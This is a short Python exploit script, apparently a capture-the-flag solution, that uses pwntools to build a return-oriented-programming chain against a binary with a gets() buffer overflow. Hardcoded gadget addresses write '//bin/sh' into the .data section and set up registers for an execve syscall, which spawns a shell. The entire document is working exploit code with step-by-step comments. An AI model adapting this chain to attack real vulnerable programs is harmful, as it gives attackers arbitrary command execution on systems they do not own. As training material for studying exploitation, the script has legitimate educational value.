from pwn import *

# No need to worry about null bytes; gets doesn't care about them
# Only thing to consider is newlines, which none of these addresses have! :)

# Defining gadgets for easier exploit writing
movedxtorax = p64(0x48d342)
poprax = p64(0x4156f4)
poprdx = p64(0x4499b5)
poprdi = p64(0x400686)
poprsi = p64(0x4100d3)
syscall = p64(0x40123c)

# Padding
e = 'p'*16 + 'fakeebp!'

# Writing required data

# pop rax = 0x6b90e0 (.data)
e += poprax
e += p64(0x6b90e0)

# pop rdx = 0x0000000069622f2f ("//bi")
e += poprdx
e += p64(0x69622f2f)

# mov dword ptr [rax], edx
e += movedxtorax

# pop rax = 0x6b90e4 (.data+4)
e += poprax
e += p64(0x6b90e4)

# pop rdx = 0x0000000068732f6e ("n/sh")
e += poprdx
e += p64(0x68732f6e)

# mov dword ptr [rax], edx
e += movedxtorax

# pop rax = 0x6b90e8 (.data+8)
e += poprax
e += p64(0x6b90e8)

# pop rdx = 0x0000000000000000 (NULL)
e += poprdx
e += p64(0)

# mov dword ptr [rax], edx
e += movedxtorax

# Moving arguments in

# pop rax = 0x000000000000003b (59)
e += poprax
e += p64(0x3b)

# pop rdi = 0x6b90e0 (.data)
e += poprdi
e += p64(0x6b90e0)

# pop rsi = 0x6b90e8 (.data+8)
e += poprsi
e += p64(0x6b90e8)

# pop rdx = 0x6b90e8 (.data+8)
e += poprdx
e += p64(0x6b90e8)

# Syscall

# syscall
e += syscall

print(e)
